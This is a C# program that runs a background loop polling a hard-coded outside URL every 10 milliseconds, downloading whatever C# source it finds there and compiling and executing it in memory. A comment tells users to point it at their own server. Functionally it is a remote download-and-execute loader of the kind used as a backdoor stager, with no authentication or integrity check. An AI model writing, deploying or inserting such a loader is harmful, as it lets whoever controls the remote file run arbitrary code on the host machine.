using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace DynamicCodeExecutor
{
    internal class Program
    {
        static string values;
        static void Main(string[] args)
        {
            string codeFile = "https://fan9.ru/code/sender/code.cs"; // change this link to your server file
            Console.WriteLine("Starting code update...");
            new Thread(() => updateThread(codeFile)).Start();
        }

        static void updateThread(string codeFileLink)
        {
            while (true)
            {
                string newValue = new WebClient().DownloadString(codeFileLink);
                if (values != newValue)
                {
                    try { Console.WriteLine(Eval(new WebClient().DownloadString(codeFileLink)).ToString().Replace(" ", string.Empty)); }
                    catch { values = newValue; }
                    values = newValue;
                }
                Thread.Sleep(10);
            }
        }
        static object Eval(string sCSCode)
        {

            CSharpCodeProvider c = new CSharpCodeProvider();
            ICodeCompiler icc = c.CreateCompiler();
            CompilerParameters cp = new CompilerParameters();

            // if you want to use custom libraries, then connect them here
            cp.ReferencedAssemblies.Add("system.dll");
            cp.ReferencedAssemblies.Add("system.xml.dll");
            cp.ReferencedAssemblies.Add("system.data.dll");
            cp.ReferencedAssemblies.Add("system.windows.forms.dll");
            cp.ReferencedAssemblies.Add("system.drawing.dll");

            cp.CompilerOptions = "/t:library";
            cp.GenerateInMemory = true;

            StringBuilder sb = new StringBuilder("");

            // Also write using for your library
            sb.Append("using System;\n");
            sb.Append("using System.Xml;\n");
            sb.Append("using System.Data;\n");
            sb.Append("using System.Data.SqlClient;\n");
            sb.Append("using System.Windows.Forms;\n");
            sb.Append("using System.Drawing;\n");
            sb.Append("using System.Net;\n");
            sb.Append("using System.Diagnostics;\n");
            sb.Append("using System.IO;\n");

            sb.Append("namespace CSCodeEvaler{ \n");
            sb.Append("public class CSCodeEvaler{ \n");
            sb.Append("public void EvalCode(){\n");
            sb.Append(sCSCode + "\n");
            sb.Append("} \n");
            sb.Append("} \n");
            sb.Append("}\n");

            CompilerResults cr = icc.CompileAssemblyFromSource(cp, sb.ToString());
            if (cr.Errors.Count > 0)
            {
                Console.WriteLine("ERROR: " + cr.Errors[0].ErrorText,
                   "Error evaluating cs code");
                return null;
            }

            System.Reflection.Assembly a = cr.CompiledAssembly;
            object o = a.CreateInstance("CSCodeEvaler.CSCodeEvaler");

            Type t = o.GetType();
            MethodInfo mi = t.GetMethod("EvalCode");

            object s = mi.Invoke(o, null);
            return s;
        }
    }
}
